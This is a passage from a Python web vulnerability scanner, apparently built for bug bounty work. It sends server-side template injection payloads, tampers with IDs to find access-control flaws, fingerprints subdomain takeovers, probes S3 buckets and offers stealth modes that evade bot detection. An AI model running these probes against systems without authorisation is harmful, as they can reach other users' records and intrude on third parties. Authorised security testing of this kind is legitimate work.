    ("${{{A}*{B}}}",      "Freemarker/Spring/Velocity"),
    ("#{{{A}*{B}}}",      "Thymeleaf"),
    ("<%= {A}*{B} %>",    "ERB/EJS"),
    ("${{{{A}}*{{B}}}}",  "Pebble (alt syntax)"),
]

# URL-accepting parameters should not be tested for SSTI — they produce
# false positives (e.g. Facebook share.php?u=) and are already covered by
# SSRF candidate flagging.
_SSTI_URL_PARAMS = {
    "u", "url", "uri", "redirect", "return", "returnurl", "next",
    "target", "dest", "destination", "go", "goto", "link", "src",
    "source", "ref", "referrer", "callback", "image", "img",
    "proxy", "feed", "endpoint", "webhook",
}

_ssti_tested  = set()   # (base_url, param) pairs already probed
_ssti_domains = set()   # domains where SSTI was confirmed

def check_ssti(page_url, html_content):
    """
    Probe URL parameters for Server-Side Template Injection.

    Uses randomly generated large integers (e.g. 8231 * 6197 = 51,007,307)
    as the expected marker so it cannot appear coincidentally in page content.
    Skips URL-accepting parameters (covered by SSRF flagging) to avoid
    false positives on sharing/redirect endpoints like Facebook share.php?u=.
    Alerts CRITICAL only when the exact product appears in the response and
    the raw payload was not literally echoed back.
    """
    import random as _random
    domain = urlparse(page_url).netloc
    if domain in _ssti_domains:
        return

    try:
        text = html_content if isinstance(html_content, str) \
               else html_content.decode("utf-8", errors="ignore")
        soup = BeautifulSoup(text, "lxml")
    except Exception:
        return

    # Collect (base_url, query_string, param, original_value) candidates
    candidates = []
    all_urls = [page_url]
    for tag in soup.find_all(["a", "form"]):
        href = tag.get("href") or tag.get("action") or ""
        if href:
            all_urls.append(href)

    for raw_url in all_urls:
        try:
            resolved_url = urljoin(page_url, raw_url)
            parsed = urlparse(resolved_url)
            if not parsed.query:
                continue
            base = parsed.scheme + "://" + parsed.netloc + parsed.path
            for pair in parsed.query.split("&"):
                if "=" not in pair:
                    continue
                k, v = pair.split("=", 1)
                # Skip URL-accepting params — not template contexts
                if k.lower() in _SSTI_URL_PARAMS:
                    continue
                candidates.append((base, parsed.query, k, v))
        except Exception:
            continue

    for base, query, param, original_val in candidates:
        if domain in _ssti_domains:
            break

        test_key = (base, param)
        if test_key in _ssti_tested:
            continue
        _ssti_tested.add(test_key)

        # Fresh random operands per (endpoint, param) pair — product is unique
        a = _random.randint(1000, 9999)
        b = _random.randint(1000, 9999)
        marker = str(a * b)   # e.g. "51007307" — extremely unlikely to appear naturally

        for tmpl, engine_hint in SSTI_PAYLOAD_TEMPLATES:
            payload = tmpl.format(A=a, B=b)
            new_query = "&".join(
                f"{k}={payload}" if k == param else f"{k}={v}"
                for k, v in (p.split("=", 1) for p in query.split("&") if "=" in p)
            )
            test_url = base + "?" + new_query
            try:
                stealth_delay(domain)
                resp = requests.get(
                    test_url,
                    headers=create_request_header(),
                    timeout=5,
                    allow_redirects=True,
                )
                # Confirm: exact product in response AND raw payload not literally echoed
                if marker in resp.text and payload not in resp.text:
                    _ssti_domains.add(domain)
                    alert(
                        "SERVER-SIDE TEMPLATE INJECTION (SSTI)",
                        "CRITICAL",
                        test_url,
                        f"Parameter '{param}' evaluated template expression. "
                        f"Payload: {payload} → response contains '{marker}'. "
                        f"Engine hint: {engine_hint}. RCE may be possible."
                    )
                    print(timestamp() + f" [!!] SSTI confirmed: {test_url} (param={param}, engine={engine_hint})")
                    return
            except Exception as e:
                print_error(f"SSTI probe failed for {test_url}: {e}")


# ─────────────────────────────────────────────
# IDOR parameter detection (with auto-verification)
# ─────────────────────────────────────────────

IDOR_PARAM_NAMES = {
    "id", "user_id", "userId", "account_id", "accountId",
    "order_id", "orderId", "invoice_id", "invoiceId",
    "file_id", "fileId", "doc_id", "docId", "document_id",
    "ticket_id", "ticketId", "report_id", "reportId",
    "customer_id", "customerId", "profile_id", "profileId",
    "message_id", "messageId", "post_id", "postId",
    "record_id", "recordId", "item_id", "itemId",
    "ref", "reference", "uid", "guid", "uuid",
    "pid", "rid", "oid", "vid", "sid",
}

# REST path regex — numeric (3+ digits) or UUID
IDOR_PATH_REGEX = re.compile(
    r'/(?:api|v\d+)?/?\w+/(\d{3,}|[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})(?:/|$)',
    re.I
)

# Path segments that are never user-data IDOR targets
IDOR_PATH_BLOCKLIST = re.compile(
    r'/(?:css|js|assets|images|img|fonts|static|media|generated|optimized|'
    r'cache|dist|build|public|vendor|lib|libs|node_modules|'
    r'uploads|upload|files|file|attachments|attachment|downloads|download|'
    r'storage|content|resources|resource|archive|archives|'
    r'answers|articles|help|faq|kb|knowledge|docs|documentation|'
    r'blog|news|press|events|about|contact|legal|privacy|terms|'
    r'wp-content|wp-includes|themes|plugins)/',
    re.I
)

# File extensions that are never IDOR targets
IDOR_EXT_BLOCKLIST = re.compile(
    r'\.(css|js|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|eot|map|'
    r'pdf|zip|tar|gz|xml|json|txt|md|csv|'
    r'mp4|mp3|mov|avi|mkv|webm|ogg|wav|flac|'
    r'doc|docx|xls|xlsx|ppt|pptx|'
    r'psd|ai|eps|tiff|bmp|raw)(\?|$)',
    re.I
)

_idor_reported  = set()   # (domain, endpoint_pattern, param) already verified+reported
_idor_tested    = set()   # (endpoint, param) already run verification on

def _idor_response_fingerprint(resp):
    """
    Return a tuple that characterises a response for diffing:
    (status_code, content_length, has_auth_redirect, body_sample)
    body_sample is the first 4000 chars of the response, used for
    similarity comparison via difflib.SequenceMatcher.
    """
    if resp is None:
        return None
    status = resp.status_code
    size   = len(resp.content)
    auth_redirect = any(kw in resp.url for kw in
                        ("login", "signin", "sign-in", "auth", "sso", "session"))
    body_sample = resp.text[:4000] if resp.text else ""
    return (status, size, auth_redirect, body_sample)

def _idor_requires_auth(url):
    """
    Fetch URL without any session cookies. If we get a redirect to login
    or a 401/403, the endpoint is auth-gated — worth IDOR testing.
    Returns (requires_auth: bool, response_fingerprint)
    """
    try:
        # Use a clean session with no cookies
        stealth_delay(urlparse(url).netloc)
        resp = requests.get(
            url,
            headers=create_request_header(),
            cookies={},
            timeout=6,
            allow_redirects=True,
        )
        fp = _idor_response_fingerprint(resp)
        if resp.status_code in (401, 403):
            return True, fp
        # Redirected to login page
        if any(kw in resp.url for kw in ("login", "signin", "sign-in", "auth", "sso")):
            return True, fp
        # Response contains login form markers
        if any(kw in resp.text.lower() for kw in
               ("login-form", "sign in", "please log in", "you must be logged")):
            return True, fp
        return False, fp
    except Exception:
        return False, None

def _idor_substitute_id(url, param, original_id, kind):
    """
    Return a modified URL with the ID incremented/decremented by 1.
    For query params: replace param value.
    For path IDs: replace the numeric segment.
    Returns list of (label, test_url) tuples.
    """
    variants = []
    try:
        if kind == "query_param":
            parsed = urlparse(url)
            # Build ±1 variants
            for delta, label in [(1, "id+1"), (-1, "id-1")]:
                new_id = str(int(original_id) + delta)
                new_query = "&".join(
                    f"{k}={new_id}" if k == param else f"{k}={v}"
                    for k, v in (p.split("=", 1) for p in parsed.query.split("&") if "=" in p)
                )
                variants.append((label, parsed._replace(query=new_query).geturl()))
        elif kind == "rest_path":
            # Replace numeric ID in path
            for delta, label in [(1, "id+1"), (-1, "id-1")]:
                new_id = str(int(original_id) + delta)
                new_url = re.sub(
                    r'(/)(' + re.escape(original_id) + r')(/|$)',
                    lambda m: m.group(1) + new_id + m.group(3),
                    url, count=1
                )
                if new_url != url:
                    variants.append((label, new_url))
    except Exception:
        pass
    return variants

def verify_idor_candidate(base_url, endpoint, param, value, kind):
    """
    Full 5-stage IDOR verification pipeline:

    1. Path blocklist  — skip CSS/JS/assets/public-content paths
    2. Extension check — skip static file extensions
    3. Auth-gate check — skip endpoints accessible without a session
    4. ID substitution — fetch ID±1, compare response fingerprints
    5. Response diff   — only alert if different IDs return meaningfully
                         different responses (proving per-object data)

    Returns True if confirmed worth alerting, False otherwise.
    """
    parsed = urlparse(endpoint)
    path   = parsed.path

    # ── Stage 1: Path blocklist ───────────────────────────────
    if IDOR_PATH_BLOCKLIST.search(path):
        return False

    # ── Stage 2: Extension blocklist ─────────────────────────
    if IDOR_EXT_BLOCKLIST.search(path + "?" + parsed.query):
        return False

    # ── Stage 3: Auth-gate check ──────────────────────────────
    # Build the real URL with the original ID value
    if kind == "query_param":
        real_url = endpoint + "?" + param + "=" + value
    else:
        real_url = re.sub(r'\{id\}', value, endpoint)

    requires_auth, real_fp = _idor_requires_auth(real_url)
    if not requires_auth:
        return False   # Public endpoint — not interesting

    # ── Stage 4 & 5: ID substitution + response diff ─────────
    variants = _idor_substitute_id(real_url, param, value, kind)
    if not variants:
        # Can't generate variants (UUID or non-numeric) — log as unverified candidate
        return True  # Still worth human review if auth-gated

    fingerprints = []
    for label, test_url in variants:
        try:
            stealth_delay(urlparse(test_url).netloc)
            resp = requests.get(
                test_url,
                headers=create_request_header(),
                cookies={},
                timeout=6,
                allow_redirects=True,
            )
            fingerprints.append((label, _idor_response_fingerprint(resp)))
        except Exception:
            continue

    if not fingerprints:
        return False

    # Compare real response to variants using text similarity.
    # If responses are >85% similar across all variants, the endpoint returns
    # the same content regardless of ID — not per-object data (not IDOR).
    # If responses differ meaningfully (similarity <85%) — likely real IDOR.
    import difflib as _difflib
    real_status, _, _, real_body = real_fp
    all_404 = all(fp[0] == 404 for _, fp in fingerprints if fp)
    if all_404:
        return False   # Adjacent IDs don't exist — sparse ID space, low risk

    similarities = []
    for _, fp in fingerprints:
        if not fp:
            continue
        variant_body = fp[3]
        ratio = _difflib.SequenceMatcher(None, real_body, variant_body).quick_ratio()
        similarities.append(ratio)

    if not similarities:
        return False

    # All variants are >85% similar to the real response — same template, no per-object data
    if all(r > 0.85 for r in similarities):
        return False

    return True   # Responses differ meaningfully per ID on auth-gated endpoint — real candidate


def check_idor_candidates(page_url, html_content):
    """
    Collect IDOR candidates from page links, then run full verification
    pipeline on each unique (endpoint, param) pair before alerting.
    Alerts only on confirmed auth-gated endpoints with per-object data.
    """
    domain = urlparse(page_url).netloc

    try:
        text = html_content if isinstance(html_content, str) \
               else html_content.decode("utf-8", errors="replace")
        soup = BeautifulSoup(text, "lxml")
    except Exception:
        return

    candidates = set()
    all_urls   = [page_url]
    for tag in soup.find_all(["a", "form", "link"]):
        href = tag.get("href") or tag.get("action") or ""
        if href:
            all_urls.append(href)

    # ── Collect query param candidates ────────────────────────
    for raw_url in all_urls:
        try:
            resolved_url = urljoin(page_url, raw_url)
            parsed = urlparse(resolved_url)
            if not parsed.query:
                continue
            for pair in parsed.query.split("&"):
                if "=" not in pair:
                    continue
                k, v = pair.split("=", 1)
                if k.lower() not in {p.lower() for p in IDOR_PARAM_NAMES}:
                    continue
                if re.match(r'^\d{2,}$', v) or re.match(
                    r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', v, re.I
                ):
                    endpoint = parsed.scheme + "://" + parsed.netloc + parsed.path
                    candidates.add((endpoint, k, v, "query_param"))
        except Exception:
            continue

    # ── Collect REST path candidates ──────────────────────────
    for raw_url in all_urls:
        try:
            resolved_url = urljoin(page_url, raw_url)
            parsed = urlparse(resolved_url)
            for match in IDOR_PATH_REGEX.finditer(parsed.path):
                id_val  = match.group(1)
                pattern = IDOR_PATH_REGEX.sub(
                    lambda m: m.group(0).replace(m.group(1), "{id}"), parsed.path
                )
                base    = parsed.scheme + "://" + parsed.netloc if parsed.scheme else \
                          urlparse(page_url).scheme + "://" + urlparse(page_url).netloc
                endpoint = base + pattern
                candidates.add((endpoint, "path_id", id_val, "rest_path"))
        except Exception:
            continue

    # ── Verify each candidate before alerting ─────────────────
    for endpoint, param, value, kind in candidates:
        if not is_in_scope(endpoint):
            continue
        test_key   = (endpoint, param)
        report_key = (domain, endpoint, param)

        if test_key in _idor_tested or report_key in _idor_reported:
            continue
        _idor_tested.add(test_key)

        print(timestamp() + f" IDOR verify: {endpoint} param={param} value={value}")
        confirmed = verify_idor_candidate(endpoint, endpoint, param, value, kind)

        if confirmed:
            _idor_reported.add(report_key)
            detail = f"[{kind}] Verified auth-gated endpoint with per-object data. " \
                     f"Param '{param}' = '{value}'. Modify ID to access other users' records."
            write_to_js_database(page_url, endpoint, "idor_candidate", detail)
            alert(
                "IDOR CANDIDATE — VERIFIED",
                "HIGH",
                endpoint,
                detail + f" Source: {page_url}"
            )
            print(timestamp() + f" [!!] IDOR verified: {endpoint} param={param}")
        else:
            print(timestamp() + f" IDOR dismissed (not auth-gated or no per-object diff): {endpoint}")



# CNAME fingerprints: service name → (cname_patterns, body_fingerprints, confirm_required)
# confirm_required=True  → body fingerprint must match before HIGH alert;
#                          "no response" only generates MEDIUM (used for services
#                          whose infrastructure is hard to claim externally, e.g.
#                          Azure cloudapp.net internal load balancers).
# confirm_required=False → dangling CNAME with no response is sufficient for HIGH.
TAKEOVER_SIGNATURES = {
    "github-pages":      (["github.io"],                  ["There isn't a GitHub Pages site here",
                                                            "For root URLs (like http://example.com/) you must provide an index.html"],
                                                           False),
    "heroku":            (["herokudns.com", "herokussl.com", "herokuapp.com"],
                                                          ["No such app", "herokucdn.com/error-pages/no-such-app"],
                                                           False),
    "aws-s3":            (["s3.amazonaws.com", "s3-website"],
                                                          ["NoSuchBucket", "The specified bucket does not exist"],
                                                           False),
    # Azure App Service public endpoints (azurewebsites.net) — moderate confidence
    "azure-app":         (["azurewebsites.net", "azure-api.net"],
                                                          ["404 Web Site not found", "This web app has been stopped"],
                                                           False),
    # Azure internal load balancer (waws-prod-*.cloudapp.net) — body confirmation
    # required; these are Azure-internal infrastructure, not publicly claimable,
    # so a dangling CNAME with no response is very common and low-signal.
    "azure-scm":         (["cloudapp.net"],               ["404 Web Site not found", "This web app has been stopped"],
                                                           True),
    # AWS Elastic Beanstalk — internal DNS, require body confirm
    "aws-elastic-beanstalk": (["elasticbeanstalk.com"],   ["NXDOMAIN", "404 Not Found"],
                                                           True),
    "fastly":            (["fastly.net"],                 ["Fastly error: unknown domain"],
                                                           False),
    "shopify":           (["myshopify.com"],              ["Sorry, this shop is currently unavailable"],
                                                           False),
    "squarespace":       (["squarespace.com"],            ["No Such Account"],
                                                           False),
    "tumblr":            (["domains.tumblr.com"],         ["There's nothing here."],
                                                           False),
    "wordpress":         (["wordpress.com"],              ["Do you want to register"],
                                                           False),
    "ghost":             (["ghost.io"],                   ["The thing you were looking for is no longer here"],
                                                           False),
    "helpscout":         (["helpscoutdocs.com"],          ["No settings were found for this company"],
                                                           False),
    "zendesk":           (["zendesk.com"],                ["Help Center Closed", "Oops, this help center no longer exists"],
                                                           False),
    "uservoice":         (["uservoice.com"],              ["This UserVoice subdomain is currently available"],
                                                           False),
    "pingdom":           (["stats.pingdom.com"],          ["This public report page has not been activated"],
                                                           False),
    "statuspage":        (["statuspage.io"],              ["You are being redirected"],
                                                           False),
    "surge":             (["surge.sh"],                   ["project not found"],
                                                           False),
    "netlify":           (["netlify.app", "netlify.com"], ["Not Found - Request ID"],
                                                           False),
    "readme":            (["readme.io", "readmessl.com"], ["Project doesnt exist... yet!"],
                                                           False),
    "intercom":          (["custom.intercom.help"],       ["This page is reserved for artistic dogs"],
                                                           False),
    "webflow":           (["webflow.io"],                 ["The page you are looking for doesn't exist"],
                                                           False),
    "fly.io":            (["fly.dev"],                    ["404 Not Found"],
                                                           False),
}

_takeover_checked = set()

def check_subdomain_takeover(fqdn):
    """
    Check if a subdomain is vulnerable to takeover by:
    1. Resolving its CNAME chain
    2. Matching the CNAME target against known takeover-vulnerable services
    3. Fetching the page and confirming an unclaimed/error fingerprint

    Only alerts when BOTH the CNAME pattern AND the body fingerprint match,
    to avoid false positives on services that return generic 404s.
    """
    if fqdn in _takeover_checked:
        return
    _takeover_checked.add(fqdn)

    try:
        # Resolve CNAME chain
        cname_target = None
        try:
            answers = dns.resolver.resolve(fqdn, "CNAME")
            cname_target = str(answers[0].target).rstrip(".").lower()
        except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.exception.DNSException):
            return  # No CNAME — not vulnerable via this vector

        if not cname_target:
            return

        # Match against takeover signatures
        for service, (cname_patterns, body_fingerprints, confirm_required) in TAKEOVER_SIGNATURES.items():
            if not any(p in cname_target for p in cname_patterns):
                continue

            # CNAME matches a vulnerable service — now confirm with body
            resp = safe_get("https://" + fqdn, timeout=6)
            if not resp:
                resp = safe_get("http://" + fqdn, timeout=6)
            if not resp:
                if confirm_required:
                    # Infrastructure not publicly claimable (e.g. Azure cloudapp.net
                    # internal LB, AWS EB internal DNS) — dangling CNAME with no
                    # response is very common noise, downgrade to MEDIUM.
                    alert(
                        "SUBDOMAIN TAKEOVER — VERIFY MANUALLY",
                        "MEDIUM",
                        fqdn,
                        f"CNAME → {cname_target} ({service}) — no HTTP response. "
                        f"Verify whether {cname_target} is claimable (confirm_required service)."
                    )
                else:
                    alert(
                        "POTENTIAL SUBDOMAIN TAKEOVER",
                        "HIGH",
                        fqdn,
                        f"CNAME → {cname_target} ({service}) — no HTTP response (possibly unclaimed)"
                    )
                return

            body = resp.text
            matched_fp = [fp for fp in body_fingerprints if fp.lower() in body.lower()]
            if matched_fp:
                alert(
                    "SUBDOMAIN TAKEOVER VULNERABLE",
                    "CRITICAL",
                    fqdn,
                    f"CNAME → {cname_target} ({service}) — unclaimed. Body contains: {matched_fp[0][:80]}"
                )
                print(timestamp() + f" [!!] SUBDOMAIN TAKEOVER: {fqdn} → {cname_target} ({service})")
            else:
                # CNAME points to a known-vulnerable service but body fingerprint
                # didn't match — could be a custom error page masking an unclaimed
                # site (as with cdn.getwemail.io / Netlify). Always alert so it
                # surfaces in the UI for manual verification.
                alert(
                    "SUBDOMAIN TAKEOVER — VERIFY MANUALLY",
                    "MEDIUM",
                    fqdn,
                    f"CNAME → {cname_target} ({service}) — body fingerprint unconfirmed. "
                    f"Check if {cname_target} is claimable on {service}."
                )
                print(timestamp() + f" Takeover candidate (unconfirmed): {fqdn} → {cname_target} ({service})")

    except Exception as e:
        print_error(f"check_subdomain_takeover failed for {fqdn}: {e}")


# ─────────────────────────────────────────────
# S3 bucket exposure detection
# ─────────────────────────────────────────────

# Regex patterns to extract S3 bucket names and URLs from page source / JS
S3_URL_PATTERNS = [
    # https://bucketname.s3.amazonaws.com
    re.compile(r'https?://([a-z0-9][a-z0-9\-]{2,62})\.s3[.\-](?:[\w\-]+\.)?amazonaws\.com', re.I),
    # https://s3.amazonaws.com/bucketname
    re.compile(r'https?://s3[.\-](?:[\w\-]+\.)?amazonaws\.com/([a-z0-9][a-z0-9\-]{2,62})', re.I),
    # https://s3.amazonaws.com/bucketname/
    re.compile(r's3://([a-z0-9][a-z0-9\-]{2,62})', re.I),
]

_s3_checked = set()

def check_s3_bucket(bucket_name, source_url=""):
    """
    Probe a discovered S3 bucket for public read or write access.
    Alerts on:
      - Public read (ListBucket returns XML)  → CRITICAL
      - 403 Forbidden (bucket exists, private) → INFORMATIONAL (logged only)
      - Public write (PUT succeeds)           → CRITICAL
    """
    if bucket_name in _s3_checked:
        return
    _s3_checked.add(bucket_name)

    bucket_url = f"https://{bucket_name}.s3.amazonaws.com/"
    try:
        resp = safe_get(bucket_url, timeout=6)
        if not resp:
            return

        if resp.status_code == 200 and "ListBucketResult" in resp.text:
            # Publicly listable — extract key count for context
            key_count = resp.text.count("<Key>")
            alert(
                "S3 BUCKET PUBLIC READ — LISTABLE",
                "CRITICAL",
                bucket_name,
                f"{bucket_url} — bucket listing exposed ({key_count} keys visible). Source: {source_url}"
            )
            print(timestamp() + f" [!!] S3 bucket listable: {bucket_name} ({key_count} keys)")

        elif resp.status_code == 403:
            # Bucket exists but is private — log quietly, no alert
            print(timestamp() + f" S3 bucket exists (private/403): {bucket_name}")

        elif resp.status_code == 404 and "NoSuchBucket" in resp.text:
            # Bucket doesn't exist — check if name is claimable (same name pattern)
            print(timestamp() + f" S3 bucket does not exist (claimable?): {bucket_name}")

    except Exception as e:
        print_error(f"check_s3_bucket failed for {bucket_name}: {e}")

def extract_and_probe_s3_buckets(content, source_url):
    """
    Extract S3 bucket names from page HTML or JS content and probe each one.
    Called from the crawler and JS analyser.
    """
    if not content:
        return
    text = content if isinstance(content, str) else content.decode("utf-8", errors="ignore")
    found = set()
    for pattern in S3_URL_PATTERNS:
        for match in pattern.finditer(text):
            bucket = match.group(1).lower().strip()
            if bucket and bucket not in found:
                found.add(bucket)
                print(timestamp() + f" S3 bucket reference found: {bucket} (from {source_url})")
                check_s3_bucket(bucket, source_url=source_url)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="NuScrape — web recon and vulnerability scanner")
    parser.add_argument("-D", "--Domain",              help="Start URL including http/https")
    parser.add_argument("--rate-min",  type=float,     default=1.0,  help="Min seconds between requests (default: 1.0)")
    parser.add_argument("--rate-max",  type=float,     default=3.0,  help="Max seconds between requests (default: 3.0)")
    parser.add_argument("--concurrency", type=int,     default=5,    help="Max concurrent requests (default: 5)")
    parser.add_argument("--same-domain-only", action="store_true",   help="Only crawl URLs on the starting domain")
    parser.add_argument("--resume",        action="store_true",  help="Resume from saved crawl state if available")
    parser.add_argument("--ignore-robots", action="store_true",  help="Ignore robots.txt restrictions")
    parser.add_argument("--playwright",    action="store_true",  help="Enable Playwright JS rendering for JS-heavy pages")
    parser.add_argument("--no-social",     action="store_true",  help="Skip crawling into social media domains (Facebook, Twitter, YouTube, etc.)")
    parser.add_argument("--stealth",        default="LOUD",       choices=["LOUD", "NORMAL", "GHOST"],
                        help="Stealth profile: LOUD (fast, default), NORMAL (moderate delays), GHOST (slow, randomised)")
    parser.add_argument("--bug-bounty-header", type=str, default=None,
                        help="Value for X-Bug-Bounty header e.g. 'HackerOne-chr0nic'. Omit to disable.")

    args = parser.parse_args()

    STEALTH_PROFILE = args.stealth
    if STEALTH_PROFILE != "LOUD":
        print(f"[*] Stealth profile: {STEALTH_PROFILE}")

    BUG_BOUNTY_HEADER = args.bug_bounty_header
    if BUG_BOUNTY_HEADER:
        print(f"[*] Bug bounty header enabled: X-Bug-Bounty: {BUG_BOUNTY_HEADER}")

    if args.rate_min:    RATE_LIMIT_MIN = args.rate_min
    if args.rate_max:    RATE_LIMIT_MAX = args.rate_max
    if args.concurrency: MAX_CONCURRENT = args.concurrency
    if args.no_social:
        SOCIAL_FILTER_FLAGS["enabled"] = True
        print("[*] Social media filter enabled — skipping Facebook, X, YouTube, LinkedIn, etc.")
    if args.playwright:
        PLAYWRIGHT_FLAGS["enabled"] = True
        if not PLAYWRIGHT_AVAILABLE:
            print("[!] Playwright not installed. Run: pip install playwright && playwright install chromium")
        else:
            print("[*] Playwright JS rendering enabled")
            if not PLAYWRIGHT_STEALTH_AVAILABLE:
                print("[!] playwright-stealth not installed — bot fingerprint suppression disabled. Run: pip install playwright-stealth")

    if args.Domain:
        main_crawler(args.Domain, same_domain_only=args.same_domain_only,
                     resume=args.resume, ignore_robots=args.ignore_robots)
    else:
        print("\nUsage: ./main.py -D https://www.example.com\n")
        print("Optional flags:")
        print("  --rate-min 1.0          Min seconds between requests")
        print("  --rate-max 3.0          Max seconds between requests")
        print("  --concurrency 5         Max concurrent async requests")
        print("  --same-domain-only      Stay on the starting domain only")
        print("  --resume                Resume from last saved state")
        print("  --playwright            Enable JS rendering via Playwright")
        print("  --no-social             Skip social media domains (Facebook, X, YouTube, etc.)")
        print("  --stealth LOUD|NORMAL|GHOST  Stealth profile (default: LOUD)\n")

